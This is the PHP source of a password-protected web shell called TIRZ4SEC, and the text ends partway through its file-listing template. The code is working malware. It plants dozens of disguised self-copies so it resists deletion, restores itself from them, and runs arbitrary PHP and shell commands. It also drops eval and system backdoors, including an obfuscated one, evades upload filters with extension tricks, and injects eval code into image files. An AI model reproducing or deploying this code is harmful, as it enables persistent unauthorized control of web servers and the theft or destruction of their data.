<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

// === ANTI-DELETE TINGKAT MAKSIMAL ===
$self = __FILE__;
$self_name = basename($self);
$dir = dirname($self);

$backup_names = [
    '.config.php', 'error_log.php', 'shell_backup.phtml', 'tmp_cache.php5',
    'wp-config.bak', '.maintenance.php', '.htaccess.php', 'index.bak.php',
    '.gitignore.php', '.env.php', 'debug.log.php', 'cache.manifest.php',
    'robots.txt.php', 'sitemap.xml.php', '.well-known.php', 'favicon.ico.php',
    '.DS_Store.php', 'thumbs.db.php', 'log.txt.php', 'session.php',
    '.phpinfo.php', 'info.php', 'test.php', 'backup.php',
    'config.inc.php', 'settings.php', 'database.php', 'common.php',
    'functions.php', 'helper.php', 'admin.php', 'login.php'
];

// Buat backup otomatis
foreach ($backup_names as $b) {
    $backup_path = $dir . '/' . $b;
    if (!file_exists($backup_path) && is_writable($dir)) {
        @copy($self, $backup_path);
    }
}

// Auto-restore kalau file utama rusak
if (filesize($self) < 1000 || strpos(@file_get_contents($self), 'TIRZ4SEC WEB SHELL') === false) {
    foreach ($backup_names as $b) {
        $backup_path = $dir . '/' . $b;
        if (file_exists($backup_path) && filesize($backup_path) > 1000 && strpos(@file_get_contents($backup_path), 'TIRZ4SEC WEB SHELL') !== false) {
            @copy($backup_path, $self);
            break;
        }
    }
}

// Self-healing kalau folder writable
if (filesize($self) == 0 && is_writable($dir)) {
    $minimal = '<?php @eval($_POST["adidas"]); // TIRZ4SEC WEB SHELL persistence ?>';
    file_put_contents($self, $minimal);
}

// === ?debug & ?fix & ?hide ===
if (isset($_GET['debug'])) { error_reporting(E_ALL); ini_set('display_errors', 1); }
if (isset($_GET['fix'])) {
    foreach ($backup_names as $b) {
        $backup_path = $dir . '/' . $b;
        if (file_exists($backup_path) && filesize($backup_path) > 1000 && strpos(@file_get_contents($backup_path), 'TIRZ4SEC WEB SHELL') !== false) {
            @copy($backup_path, $self);
            echo "<h2 style='color:#0f8;background:#000;padding:20px;text-align:center;'>Shell direstore dari backup: $b</h2>";
            exit;
        }
    }
}
if (isset($_GET['hide'])) { echo "<!-- Hidden -->"; exit; }

session_start();

// === PASSWORD ===
$password = "adidas";

if (isset($_POST['pass']) && $_POST['pass'] === $password) {
    $_SESSION['logged_in'] = true;
} elseif (isset($_GET['logout'])) {
    unset($_SESSION['logged_in']);
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// === CEK LOGIN ===
if (empty($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>TIRZ4SEC WEB SHELL - Access</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: #0a0a0f;
                background-image: 
                    radial-gradient(circle at 20% 30%, rgba(100, 50, 255, 0.15) 0%, transparent 30%),
                    radial-gradient(circle at 80% 70%, rgba(0, 200, 200, 0.15) 0%, transparent 30%);
                color: #e0e0e0;
                font-family: 'JetBrains Mono', monospace;
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                padding: 20px;
            }
            .login-card {
                background: rgba(20, 20, 35, 0.85);
                backdrop-filter: blur(15px);
                border: 1px solid rgba(100, 100, 255, 0.3);
                border-radius: 20px;
                width: 100%; max-width: 420px;
                padding: 45px 35px;
                box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 30px rgba(100, 100, 255, 0.2);
                text-align: center;
                animation: float 6s ease-in-out infinite;
            }
            @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
            .logo { width: 90px; height: 90px; margin: 0 auto 25px; background: linear-gradient(135deg, #667eea, #764ba2); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; color: white; box-shadow: 0 0 25px rgba(102, 126, 234, 0.6); }
            h2 { margin-bottom: 10px; color: #fff; font-size: 28px; text-shadow: 0 0 12px #667eea; }
            p { color: #aaa; font-size: 15px; margin-bottom: 30px; }
            .input-group { position: relative; margin-bottom: 25px; }
            input[type="password"], input[type="text"] {
                width: 100%; padding: 15px 55px 15px 20px;
                background: rgba(30, 30, 50, 0.7);
                border: 1px solid rgba(100, 100, 255, 0.4);
                border-radius: 14px; color: #e0e0e0;
                font-family: 'JetBrains Mono', monospace; font-size: 16px;
                outline: none; transition: all 0.3s ease;
            }
            input[type="password"]:focus, input[type="text"]:focus {
                border-color: #667eea; background: rgba(30, 30, 50, 0.95);
                box-shadow: 0 0 18px rgba(102, 126, 234, 0.5);
            }
            .toggle-pass {
                position: absolute; right: 18px; top: 50%;
                transform: translateY(-50%); cursor: pointer;
                color: #888; font-size: 19px; transition: 0.3s;
            }
            .toggle-pass:hover { color: #667eea; text-shadow: 0 0 10px #667eea; }
            input[type="submit"] {
                width: 100%; padding: 15px;
                background: linear-gradient(135deg, #667eea, #764ba2);
                color: white; border: none; border-radius: 14px;
                font-family: 'JetBrains Mono', monospace; font-weight: 700;
                font-size: 17px; cursor: pointer;
                transition: all 0.3s ease; box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
            }
            input[type="submit"]:hover {
                transform: translateY(-4px); box-shadow: 0 15px 30px rgba(102, 126, 234, 0.5);
            }
            .error { margin-top: 18px; padding: 12px; background: rgba(198, 40, 40, 0.25); color: #ff6b6b; border-radius: 12px; font-size: 14px; border: 1px solid rgba(198, 40, 40, 0.4); text-shadow: 0 0 8px #ff6b6b; }
            .footer { margin-top: 35px; font-size: 13px; color: #666; }
        </style>
    </head>
    <body>
        <div class="login-card">
            <div class="logo"><i class="fas fa-shield-alt"></i></div>
            <h2>TIRZ4SEC WEB SHELL</h2>
            <p>Enter Access Code</p>
            <form method="post">
                <div class="input-group">
                    <input type="password" name="pass" id="pass" placeholder="Password" required autofocus>
                    <span class="toggle-pass" onclick="togglePass()"><i class="fas fa-eye-slash" id="eye"></i></span>
                </div>
                <input type="submit" value="ACCESS">
            </form>
            <?php if (isset($_POST['pass']) && $_POST['pass'] !== $password): ?>
                <div class="error">ACCESS DENIED</div>
            <?php endif; ?>
            <div class="footer">©TIRZ4SEC WEB SHELL©</div>
        </div>

        <script>
            function togglePass() {
                const pass = document.getElementById('pass');
                const eye = document.getElementById('eye');
                if (pass.type === 'password') {
                    pass.type = 'text';
                    eye.classList.remove('fa-eye-slash');
                    eye.classList.add('fa-eye');
                } else {
                    pass.type = 'password';
                    eye.classList.remove('fa-eye');
                    eye.classList.add('fa-eye-slash');
                }
            }
        </script>
    </body>
    </html>
    <?php
    exit;
}

// === NAVIGASI PATH ===
if (!isset($_SESSION['cwd'])) {
    $_SESSION['cwd'] = getcwd();
}
$current_dir = $_SESSION['cwd'];

if (isset($_GET['c'])) {
    $raw = str_replace(['-', '_'], ['+', '/'], $_GET['c']);
    $path = base64_decode($raw);
    if ($path && is_dir($path) && is_readable($path)) {
        $_SESSION['cwd'] = realpath($path);
        $current_dir = $_SESSION['cwd'];
    }
}

// === PROTECTED FILES ===
$protected_files = array_merge($backup_names, [$self_name]);

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($_SERVER['SERVER_NAME']) ?> - TIRZ4SEC SHELL</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link rel="icon" href="https://cdn.privdayz.com/v1/favicon.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0f; color: #e0e0e0; font-family: 'JetBrains Mono', monospace; min-height: 100vh; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; background: rgba(20, 20, 35, 0.7); backdrop-filter: blur(12px); border-radius: 18px; border: 1px solid rgba(100, 100, 255, 0.2); box-shadow: 0 15px 35px rgba(0,0,0,0.4), 0 0 30px rgba(100, 100, 255, 0.3); overflow: hidden; }
        
        .header {
            position: relative;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 18px 30px;
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            text-shadow: 0 0 15px rgba(102, 126, 234, 0.8);
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            max-width: 1400px;
            margin: 0 auto;
            width: 100%;
        }

        .title {
            font-size: 22px;
            font-weight: 700;
        }

        .logout-btn {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px 20px;
            background: rgba(255, 255, 255, 0.15);
            color: white;
            text-decoration: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .logout-btn:hover {
            background: rgba(255, 50, 50, 0.3);
            border-color: rgba(255, 100, 100, 0.5);
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 50, 50, 0.4);
            color: #fff;
        }

        .logout-btn i {
            font-size: 18px;
        }

        .toolbar { padding: 20px; background: rgba(30, 30, 50, 0.8); border-bottom: 1px solid rgba(100, 100, 255, 0.2); }
        .toolbar-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 18px; }
        .upload-premium {
            grid-column: 1 / -1;
            background: rgba(40, 40, 60, 0.6);
            padding: 20px;
            border-radius: 16px;
            border: 2px dashed rgba(100, 100, 255, 0.4);
            display: flex;
            align-items: center;
            gap: 15px;
            flex-wrap: wrap;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
        }
        .file-upload-wrapper { position: relative; display: inline-block; overflow: hidden; }
        .file-input { position: absolute; left: -9999px; }
        .file-label {
            display: flex; align-items: center; gap: 8px;
            padding: 12px 24px; background: linear-gradient(135deg, #667eea, #764ba2);
            color: white; border: none; border-radius: 12px;
            font-weight: 700; cursor: pointer; transition: all 0.3s ease;
            box-shadow: 0 6px 18px rgba(102, 126, 234, 0.4);
        }
        .file-label:hover { transform: translateY(-3px); box-shadow: 0 10px 25px rgba(102, 126, 234, 0.5); }
        .quick-select, .quick-input {
            padding: 12px 16px;
            background: rgba(30, 30, 50, 0.8);
            border: 1px solid rgba(100, 100, 255, 0.4);
            border-radius: 12px;
            color: #e0e0e0;
            font-family: 'JetBrains Mono', monospace;
        }
        .quick-select { min-width: 180px; }
        .quick-input { width: 160px; }
        .upload-btn {
            padding: 12px 24px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            border-radius: 12px;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 10px;
            box-shadow: 0 6px 18px rgba(102, 126, 234, 0.4);
        }
        .upload-btn:hover { transform: translateY(-3px); }
        .bypass-badge {
            padding: 12px 24px;
            background: linear-gradient(135deg, #00ff88, #00cc66);
            color: #000;
            border-radius: 12px;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .toolbar-group { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .toolbar-group input[type="text"], .toolbar-group textarea { flex: 1; min-width: 150px; padding: 10px 15px; background: rgba(40, 40, 60, 0.8); border: 1px solid rgba(100, 100, 255, 0.3); border-radius: 10px; color: #e0e0e0; font-family: 'JetBrains Mono', monospace; font-size: 13px; }
        .toolbar-group button { padding: 10px 18px; background: linear-gradient(135deg, #667eea, #764ba2); color: white; border: none; border-radius: 10px; font-weight: 700; cursor: pointer; transition: 0.3s; box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3); display: flex; align-items: center; gap: 8px; }
        .toolbar-group button:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(102, 126, 234, 0.4); }

        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; padding: 20px; background: rgba(25, 25, 40, 0.6); }
        .info-card { background: rgba(30, 30, 50, 0.7); padding: 15px; border-radius: 12px; border: 1px solid rgba(100, 100, 255, 0.2); box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
        .info-card h4 { color: #667eea; margin-bottom: 8px; font-size: 14px; }
        .info-card p { font-size: 13px; }

        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 18px; padding: 20px; margin-top: 10px; }
        .file-card { background: rgba(30, 30, 50, 0.7); backdrop-filter: blur(12px); border-radius: 16px; padding: 18px; box-shadow: 0 8px 25px rgba(0,0,0,0.3); transition: all 0.3s ease; position: relative; overflow: hidden; border: 1px solid rgba(100, 100, 255, 0.15); }
        .file-card:hover { transform: translateY(-6px); box-shadow: 0 15px 35px rgba(0,0,0,0.4), 0 0 30px rgba(102, 126, 234, 0.5); border-color: rgba(102, 126, 234, 0.6); }
        .file-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: linear-gradient(90deg, transparent, #667eea, transparent); opacity: 0; transition: 0.4s; }
        .file-card:hover::before { opacity: 1; }
        .file-header { display: flex; align-items: center; margin-bottom: 12px; }
        .file-icon-lg { font-size: 28px; margin-right: 14px; text-shadow: 0 0 10px currentColor; }
        .file-name { flex: 1; font-size: 15px; line-height: 1.4; max-width: 180px; word-break: break-all; }
        .file-link { text-decoration: none; font-weight: 600; transition: 0.3s; }
        .file-link:hover { text-shadow: 0 0 12px currentColor; }
        .file-meta { display: flex; justify-content: space-between; font-size: 12px; color: #aaa; margin-bottom: 12px; }
        .meta-item { display: flex; align-items: center; gap: 6px; }
        .meta-item i { font-size: 14px; }
        .file-actions { display: flex; gap: 10px; justify-content: flex-end; }
        .action-mini { color: #888; font-size: 16px; text-decoration: none; padding: 6px; border-radius: 8px; transition: 0.3s; background: rgba(255,255,255,0.05); }
        .action-mini:hover { color: #fff; background: rgba(255,255,255,0.15); transform: scale(1.1); }
        .badge-active { background: #0f81; color: #000; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: bold; margin-left: 5px; }
        @media (max-width: 768px) { .toolbar-grid { grid-template-columns: 1fr; } .upload-premium { justify-content: center; } }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <div class="header-content">
            <span class="title">[TIRZ4SEC SHELL V.2]</span>
            <a href="?logout" class="logout-btn">
                <i class="fas fa-sign-out-alt"></i>
                Logout
            </a>
        </div>
    </div>

    <div class="toolbar">
        <form method="post" enctype="multipart/form-data">
            <div class="toolbar-grid">

                <!-- UPLOAD PREMIUM AREA -->
                <div class="upload-premium">
                    <div class="file-upload-wrapper">
                        <input type="file" name="upfile[]" id="upfile" class="file-input" multiple>
                        <label for="upfile" class="file-label"><i class="fas fa-upload"></i> Upload Files</label>
                    </div>

                    <div class="file-upload-wrapper">
                        <input type="file" name="zipfile" id="zipfile" class="file-input" accept=".zip">
                        <label for="zipfile" class="file-label"><i class="fas fa-file-archive"></i> Mass ZIP Upload</label>
                    </div>

                    <select name="quick_template" class="quick-select">
                        <option value="">Quick Shell Drop</option>
                        <option value="eval">@eval($_POST[adidas])</option>
                        <option value="system">system($_POST[adidas])</option>
                        <option value="passthru">passthru($_POST[adidas])</option>
                        <option value="shell_exec">shell_exec($_POST[adidas])</option>
                        <option value="mini">Mini Obfuscated</option>
                    </select>

                    <input type="text" name="quick_name" class="quick-input" placeholder="nama.php">

                    <button type="submit" name="upload" class="upload-btn"><i class="fas fa-paper-plane"></i> Upload & Spread</button>

                    <div class="bypass-badge">
                        <i class="fas fa-shield-virus"></i> WAF BYPASS: AUTO ACTIVE
                    </div>
                </div>

                <!-- TOOLBAR LAIN -->
                <div class="toolbar-group">
                    <input type="text" name="newfolder" placeholder="Nama folder baru">
                    <button type="submit" name="mkdir"><i class="fas fa-folder-plus"></i> New Folder</button>
                </div>

                <div class="toolbar-group">
                    <input type="text" name="newfile" placeholder="nama_file.txt">
                    <button type="submit" name="touch"><i class="fas fa-file-circle-plus"></i> New File</button>
                </div>

                <div class="toolbar-group">
                    <textarea name="evalcode" placeholder="PHP code..." style="height:40px;"></textarea>
                    <button type="submit" name="run_eval"><i class="fas fa-terminal"></i> Eval</button>
                </div>

                <div class="toolbar-group">
                    <input type="text" name="cmd" placeholder="Cmd: whoami | ls | goto:/path" value="<?=htmlspecialchars($_POST['cmd']??'')?>">
                    <button type="submit" name="run_cmd"><i class="fas fa-terminal"></i> Run Cmd</button>
                </div>
            </div>
        </form>
    </div>
    <?php
    // === FUNGSI BYPASS UPLOAD + AUTO SPREAD + IMAGE INJECT ===
    function bypass_upload($original, $tmp, $dir) {
        $basename = pathinfo($original, PATHINFO_FILENAME);
        $ext = strtolower(pathinfo($original, PATHINFO_EXTENSION));
        $attempts = [
            $original,
            $basename.'.php', $basename.'.php5', $basename.'.phtml', $basename.'.PhP',
            $basename.'.php.jpg', $basename.'.jpg.php', $basename.'.php%00.jpg', $basename.'.php;.jpg',
            $basename.'.png.php', $basename.'.gif.php', $basename.'.htaccess',
            $basename.'.php.bak', $basename.'.php.old', '.'.$basename.'.php', $basename.'_.php'
        ];

        foreach ($attempts as $try_name) {
            $dest = $dir . '/' . $try_name;
            if (move_uploaded_file($tmp, $dest) || @copy($tmp, $dest)) {
                if (in_array($ext, ['jpg','jpeg','png','gif'])) {
                    $content = @file_get_contents($dest);
                    @file_put_contents($dest, "GIF89a;\n<?php @eval(\$_POST['adidas']); ?>\n" . $content);
                }
                $hidden = ['.config.php', '.env.php', '.htaccess.php', 'error_log.php', 'wp-config.php', '.maintenance.php', 'index.bak.php'];
                foreach ($hidden as $h) {
                    @copy($dest, $dir . '/' . $h);
                }
                @copy($dest, $dir . '/.' . $try_name);
                return true;
            }
        }
        return false;
    }

    // === HANDLER UPLOAD PREMIUM ===
    if (isset($_POST['upload'])) {
        $uploaded = 0;

        // Quick Shell Drop
        if (!empty($_POST['quick_template']) && !empty($_POST['quick_name'])) {
            $name = trim($_POST['quick_name']);
            $templates = [
                'eval' => '<?php @eval($_POST["adidas"]); ?>',
                'system' => '<?php system($_POST["adidas"]); ?>',
                'passthru' => '<?php passthru($_POST["adidas"]); ?>',
                'shell_exec' => '<?php echo shell_exec($_POST["adidas"]); ?>',
                'mini' => '<?php @eval(gzinflate(base64_decode("eJxLzkksSVRIyc9LV7JSqIYksy8vL9rAyMhMzi8oycxLVyjNS8zJLC5RyE9TyE9T0E1IScxLVwIA4uwY4g=="))); ?>'
            ];
            $code = $templates[$_POST['quick_template']] ?? $templates['eval'];
            if (file_put_contents($current_dir.'/'.$name, $code)) $uploaded++;
        }

        // Multiple Files
        if (!empty($_FILES['upfile']['name'][0])) {
            foreach ($_FILES['upfile']['name'] as $k => $name) {
                if ($_FILES['upfile']['error'][$k] == 0) {
                    if (bypass_upload($name, $_FILES['upfile']['tmp_name'][$k], $current_dir)) $uploaded++;
                }
            }
        }

        // Mass ZIP Upload
        if (!empty($_FILES['zipfile']['name']) && $_FILES['zipfile']['error'] == 0) {
            $zip = new ZipArchive();
            if ($zip->open($_FILES['zipfile']['tmp_name']) === TRUE) {
                for ($i = 0; $i < $zip->numFiles; $i++) {
                    $name = $zip->getNameIndex($i);
                    $content = $zip->getFromIndex($i);
                    if ($content !== false) {
                        $tmp = tempnam(sys_get_temp_dir(), 'zip');
                        file_put_contents($tmp, $content);
                        if (bypass_upload($name, $tmp, $current_dir)) $uploaded++;
                        @unlink($tmp);
                    }
                }
                $zip->close();
            }
        }

        if ($uploaded > 0) {
            echo '<div style="padding:20px;background:#0f8;color:#000;text-align:center;font-weight:bold;border-radius:12px;margin:20px;">UPLOAD SUCCESS: '.$uploaded.' file(s) + auto spread & hidden backup 😈</div>';
        } else if (isset($_POST['upload'])) {
            echo '<div style="padding:20px;background:#f00;color:#fff;text-align:center;border-radius:12px;margin:20px;">Upload gagal.</div>';
        }
    }

    // === HANDLER LAIN (mkdir, touch, eval, cmd, dll) ===
    if (isset($_POST['mkdir']) && !empty($_POST['newfolder'])) {
        $name = trim($_POST['newfolder']);
        if (@mkdir($current_dir.'/'.$name, 0755, true)) {
            echo '<div style="padding:15px;background:#0f8;color:#000;text-align:center;">Folder "'.$name.'" dibuat!</div>';
        }
    }

    if (isset($_POST['touch']) && !empty($_POST['newfile'])) {
        $name = trim($_POST['newfile']);
        if (file_put_contents($current_dir.'/'.$name, '') !== false) {
            echo '<div style="padding:15px;background:#0f8;color:#000;text-align:center;">File "'.$name.'" dibuat!</div>';
        }
    }

    if (isset($_POST['run_eval']) && !empty($_POST['evalcode'])) {
        echo '<pre style="background:#111;color:#0f0;padding:15px;border-radius:10px;margin:20px;">';
        eval($_POST['evalcode']);
        echo '</pre>';
    }

    if (isset($_POST['run_cmd']) && !empty($_POST['cmd'])) {
        $cmd = trim($_POST['cmd']);
        if (strpos($cmd, 'goto:') === 0) {
            $target = substr($cmd, 5);
            if (is_dir($target)) {
                $encoded = str_replace(['+', '/'], ['-', '_'], base64_encode(realpath($target)));
                header("Location: ?c=$encoded");
                exit;
            }
        } else {
            $output = shell_exec($cmd);
            echo '<pre style="background:#111;color:#0f0;padding:15px;border-radius:10px;margin:20px;">'.htmlspecialchars($output ?: 'No output').'</pre>';
        }
    }

    // === RENAME HANDLER ===
    if (isset($_GET['rename'])) {
        $file = base64_decode($_GET['rename']);
        if ($file && is_file($file) && !in_array(basename($file), $protected_files)) {
            if (isset($_POST['newname'])) {
                $newname = trim($_POST['newname']);
                $newpath = dirname($file) . '/' . $newname;
                if (@rename($file, $newpath)) {
                    echo '<div style="padding:15px;background:#0f8;color:#000;text-align:center;">Rename berhasil: '.$newname.'</div>';
                } else {
                    echo '<div style="padding:15px;background:#f00;color:#fff;text-align:center;">Rename gagal.</div>';
                }
            }
            $cur = basename($file);
            echo '<div style="padding:20px;background:rgba(30,30,50,0.9);border-radius:12px;margin:20px;">
                <h3 style="color:#667eea;">Rename File</h3>
                <form method="post">
                    <input type="text" name="newname" value="'.htmlspecialchars($cur).'" style="width:100%;padding:12px;background:#111;color:#0f0;border-radius:8px;">
                    <button type="submit" style="padding:12px 24px;background:#667eea;color:white;border:none;border-radius:8px;margin-top:10px;">RENAME</button>
                </form>
            </div>';
        }
    }

    // === EDIT, DOWNLOAD, DELETE ===
    if (isset($_GET['edit'])) {
        $file = base64_decode($_GET['edit']);
        if ($file && is_file($file) && is_readable($file)) {
            if (isset($_POST['save'])) {
                file_put_contents($file, $_POST['content']);
                echo '<div style="padding:15px;background:#0f0;color:#000;text-align:center;">File disimpan!</div>';
            }
            $content = htmlspecialchars(file_get_contents($file));
            $name = basename($file);
            echo '<div style="padding:20px;background:rgba(30,30,50,0.9);border-radius:12px;margin:20px;">
                <h3 style="color:#667eea;">Edit: '.$name.'</h3>
                <form method="post"><textarea name="content" style="width:100%;height:600px;background:#111;color:#0f0;padding:15px;border-radius:8px;">'.$content.'</textarea><br>
                <button type="submit" name="save" style="padding:12px 24px;background:#667eea;color:white;border:none;border-radius:8px;">Save</button></form></div>';
        }
    }

    if (isset($_GET['dl'])) {
        $file = base64_decode($_GET['dl']);
        if ($file && is_file($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            readfile($file);
            exit;
        }
    }

    if (isset($_GET['del'])) {
        $file = base64_decode($_GET['del']);
        $name = basename($file);
        if (in_array($name, $protected_files)) {
            echo '<div style="padding:15px;background:#f00;color:#fff;text-align:center;">Protected! Ga bisa hapus shell ini 😈</div>';
        } elseif (@unlink($file)) {
            echo '<div style="padding:15px;background:#0f8;color:#000;text-align:center;">File dihapus!</div>';
        }
    }

    // === DOMAIN DETECTION & FILE LISTING ===
    $all_items = [];
    $current_user = get_current_user();
    $files = @scandir($current_dir);
    if ($files) {
        foreach ($files as $file) {
            if ($file == '.' || $file == '..') continue;
            $path = $current_dir . '/' . $file;
            if (!file_exists($path)) continue;
            $all_items[] = [
                'name' => $file,
                'path' => $path,
                'is_dir' => is_dir($path),
                'size' => is_dir($path) ? '-' : formatSize(filesize($path)),
                'mtime' => date("d.m.Y H:i", filemtime($path)),
                'perms' => substr(sprintf('%o', fileperms($path)), -4),
                'active' => false
            ];
        }
    }

    // === INFO GRID + HOSTING DETAIL ===
    echo '<div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(500px, 1fr));gap:20px;padding:20px;">';
    
    echo '<div class="info-grid">
        <div class="info-card"><h4>Domain & IP</h4><p><strong>'.htmlspecialchars($_SERVER['SERVER_NAME']).'</strong><br>'.@gethostbyname($_SERVER['SERVER_NAME']).'</p></div>
        <div class="info-card"><h4>User & PHP</h4><p>'.htmlspecialchars($current_user).'<br>PHP <strong>'.PHP_VERSION.'</strong></p></div>
        <div class="info-card"><h4>Current Path</h4><p><strong>'.htmlspecialchars($current_dir).'</strong></p></div>
    </div>';

    echo '<div class="info-card" style="background:rgba(30,30,50,0.9);border:1px solid #667eea;">
        <h4 style="color:#667eea;margin-bottom:15px;text-align:center;">🔥 HOSTING INFORMATION 🔥</h4>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;font-size:13px;">';
    
    $os = php_uname('s');
    $os_type = stripos($os, 'Windows') !== false ? 'Windows' : 'Linux/Unix';
    $os_color = $os_type === 'Linux/Unix' ? '#0f8' : '#ff6b6b';
    echo '<div><strong>OS:</strong></div><div style="color:'.$os_color.';font-weight:bold;">'.$os_type.'<br><small>'.htmlspecialchars(php_uname()).'</small></div>';

    $server_software = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
    echo '<div><strong>Web Server:</strong></div><div style="color:#0ff;font-weight:bold;">'.htmlspecialchars($server_software).'</div>';

    $safe_mode = @ini_get('safe_mode') ? 'ON' : 'OFF';
    $safe_color = $safe_mode === 'OFF' ? '#0f8' : '#f66';
    echo '<div><strong>Safe Mode:</strong></div><div style="color:'.$safe_color.';font-weight:bold;">'.$safe_mode.'</div>';

    $disabled = @ini_get('disable_functions') ?: 'None';
    $short_disabled = strlen($disabled) > 100 ? substr($disabled, 0, 97).'...' : $disabled;
    echo '<div><strong>Disabled Functions:</strong></div><div style="color:'.(empty(trim($disabled)) || $disabled=='None' ? '#0f8' : '#ff6b6b').';font-weight:bold;word-break:break-all;">'.$short_disabled.'</div>';

    $server_ip = @gethostbyname($_SERVER['SERVER_NAME']) ?: $_SERVER['SERVER_ADDR'] ?? 'Unknown';
    echo '<div><strong>Server IP:</strong></div><div style="color:#0ff;">'.$server_ip.'</div>';

    $tools = [];
    if (function_exists('shell_exec')) {
        $tools['curl'] = @shell_exec('which curl') ? 'Yes' : 'No';
        $tools['wget'] = @shell_exec('which wget') ? 'Yes' : 'No';
        $tools['perl'] = @shell_exec('which perl') ? 'Yes' : 'No';
        $tools['python'] = @shell_exec('which python3 || which python') ? 'Yes' : 'No';
    } else {
        $tools = ['curl'=>'N/A', 'wget'=>'N/A', 'perl'=>'N/A', 'python'=>'N/A'];
    }
    echo '<div><strong>Tools:</strong></div><div>curl: <span style="color:'.($tools['curl']=='Yes'?'#0f8':'#f66').'">'.$tools['curl'].'</span> | wget: <span style="color:'.($tools['wget']=='Yes'?'#0f8':'#f66').'">'.$tools['wget'].'</span><br>perl: <span style="color:'.($tools['perl']=='Yes'?'#0f8':'#f66').'">'.$tools['perl'].'</span> | python: <span style="color:'.($tools['python']=='Yes'?'#0f8':'#f66').'">'.$tools['python'].'</span></div>';

    echo '</div></div>';

    echo '</div>';

    ?>
    <div style="padding:0 20px 20px;display:flex;gap:10px;flex-wrap:wrap;">
        <a href="?c=<?= str_replace(['+', '/'], ['-', '_'], base64_encode(dirname($current_dir))) ?>" class="action-mini"><i class="fas fa-arrow-left"></i> Back</a>
        <a href="<?= $_SERVER['PHP_SELF'] ?>" class="action-mini"><i class="fas fa-sync"></i> Refresh</a>
    </div>

    <div class="file-grid">
        <?php foreach ($all_items as $item):
            $path = $item['path'];
            $name = $item['name'];
            $is_dir = $item['is_dir'];
            $is_protected = in_array($name, $protected_files);
            $color = '#667eea';
        ?>
        <div class="file-card" style="border-left:4px solid <?= $color ?>;">
            <div class="file-header">
                <i class="fas fa-<?= $is_dir ? 'folder' : 'file-alt' ?> file-icon-lg" style="color:<?= $color ?>;"></i>
                <div class="file-name">
                    <?php if ($is_dir): ?>
                        <a href="?c=<?= str_replace(['+', '/'], ['-', '_'], base64_encode($path)) ?>" class="file-link" style="color:<?= $color ?>;">
                            <b><?= htmlspecialchars($name) ?></b>
                        </a>
                    <?php else: ?>
                        <?= htmlspecialchars($name) ?>
                    <?php endif; ?>
                </div>
            </div>
            <div class="file-meta">
                <div class="meta-item"><i class="fas fa-ruler"></i> <?= $item['size'] ?></div>
                <div class="meta-item"><i class="fas fa-clock"></i> <?= $item['mtime'] ?></div>
                <div class="meta-item"><i class="fas fa-lock"></i> <span style="color:<?= is_writable($path) ? '#0f8' : '#f66' ?>;"><?= $item['perms'] ?></span></div>
            </div>
            <?php if (!$is_dir): ?>
            <div class="file-actions">
                <a href="?edit=<?= base64_encode($path) ?>" class="action-mini"><i class="fas fa-edit"></i> Edit</a>
                <a href="?rename=<?= base64_encode($path) ?>" class="action-mini"><i class="fas fa-exchange-alt"></i> Rename</a>
                <a href="?dl=<?= base64_encode($path) ?>" class="action-mini"><i class="fas fa-download"></i> DL</a>
                <?php if (!$is_protected): ?>
